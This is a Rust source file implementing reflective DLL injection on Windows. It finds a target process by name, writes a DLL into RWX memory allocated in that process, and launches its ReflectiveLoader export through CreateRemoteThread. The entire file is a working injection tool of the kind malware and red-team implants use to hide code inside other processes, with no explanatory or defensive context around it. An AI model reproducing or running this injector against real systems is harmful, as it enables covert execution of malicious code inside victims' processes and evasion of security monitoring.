use std::fs;
use std::mem;
use std::ffi::c_void;
use goblin::pe::PE;
use windows::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE, BOOL, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, PROCESS_ALL_ACCESS, LPTHREAD_START_ROUTINE,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;

fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    let h_snapshot = unsafe {
        match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(h) => h,
            Err(_) => return None,
        }
    };
    if h_snapshot == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut pe32 = PROCESSENTRY32W {
        dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    if unsafe { Process32FirstW(h_snapshot, &mut pe32).is_ok() } {
        loop {
            let exe_name = String::from_utf16_lossy(&pe32.szExeFile);
            let exe_name = exe_name.trim_matches(char::from(0));
            if exe_name.eq_ignore_ascii_case(process_name) {
                unsafe { let _ = CloseHandle(h_snapshot); }
                return Some(pe32.th32ProcessID);
            }
            if !unsafe { Process32NextW(h_snapshot, &mut pe32).is_ok() } {
                break;
            }
        }
    }

    unsafe { let _ = CloseHandle(h_snapshot); }
    None
}

// Function to find the RVA of the ReflectiveLoader export
fn find_reflective_loader_rva(dll_bytes: &[u8]) -> Option<u32> {
    let pe = PE::parse(dll_bytes).ok()?;
    for export in pe.exports {
        if let Some(name) = export.name {
            if name == "ReflectiveLoader" {
                return Some(export.rva as u32);
            }
        }
    }
    None
}

// Function to convert RVA to File Offset
fn rva_to_file_offset(pe: &PE, rva: u32) -> Option<u32> {
    for section in &pe.sections {
        if rva >= section.virtual_address && rva < section.virtual_address + section.virtual_size {
            return Some(rva - section.virtual_address + section.pointer_to_raw_data);
        }
    }
    None
}

fn main() {
    let target_process = "notepad.exe";
    let dll_path = "reflective_dll.dll";

    println!("[+] Searching for process: {}", target_process);
    let pid = match get_process_id_by_name(target_process) {
        Some(pid) => pid,
        None => {
            eprintln!("[-] Could not find process: {}", target_process);
            return;
        }
    };
    println!("[+] Found {} with PID: {}", target_process, pid);

    let dll_bytes = match fs::read(dll_path) {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("[-] Failed to read DLL file: {}", e);
            return;
        }
    };

    let pe = match PE::parse(&dll_bytes) {
        Ok(pe) => pe,
        Err(_) => {
            eprintln!("[-] Failed to parse DLL");
            return;
        }
    };

    let loader_rva = match find_reflective_loader_rva(&dll_bytes) {
        Some(rva) => rva,
        None => {
            eprintln!("[-] Could not find ReflectiveLoader export in DLL");
            return;
        }
    };

    let loader_offset = match rva_to_file_offset(&pe, loader_rva) {
        Some(offset) => offset,
        None => {
            eprintln!("[-] Failed to convert RVA to file offset");
            return;
        }
    };

    println!("[+] Found ReflectiveLoader RVA: 0x{:X}, File Offset: 0x{:X}", loader_rva, loader_offset);

    println!("[+] Opening target process...");
    let h_process = unsafe {
        match OpenProcess(PROCESS_ALL_ACCESS, BOOL::from(false), pid) {
            Ok(h) => h,
            Err(e) => {
                eprintln!("[-] Failed to open target process: {}", e);
                return;
            }
        }
    };

    println!("[+] Allocating memory in target process...");
    let remote_buffer = unsafe {
        VirtualAllocEx(
            h_process,
            None,
            dll_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        eprintln!("[-] Failed to allocate memory in target process");
        unsafe { let _ = CloseHandle(h_process); }
        return;
    }
    println!("[+] Allocated memory at {:?}", remote_buffer);

    println!("[+] Writing DLL to target process...");
    let mut bytes_written: usize = 0;
    let res = unsafe {
        WriteProcessMemory(
            h_process,
            remote_buffer,
            dll_bytes.as_ptr() as *const _,
            dll_bytes.len(),
            Some(&mut bytes_written),
        )
    };

    if res.is_err() {
        eprintln!("[-] Failed to write DLL to target process");
        unsafe { let _ = CloseHandle(h_process); }
        return;
    }
    println!("[+] Wrote {} bytes to target process", bytes_written);

    // Calculate the address of the ReflectiveLoader in the target process
    let remote_loader_addr = (remote_buffer as usize + loader_offset as usize) as *const c_void;

    println!("[+] Executing ReflectiveLoader in target process...");
    let h_thread = unsafe {
        CreateRemoteThread(
            h_process,
            None,
            0,
            mem::transmute::<*const c_void, LPTHREAD_START_ROUTINE>(remote_loader_addr),
            Some(remote_buffer),
            0,
            None,
        )
    };

    match h_thread {
        Ok(h) => {
            println!("[+] Remote thread created: {:?}", h);
            unsafe { let _ = CloseHandle(h); }
        }
        Err(e) => {
            eprintln!("[-] Failed to create remote thread: {}", e);
        }
    }

    unsafe { let _ = CloseHandle(h_process); }
}
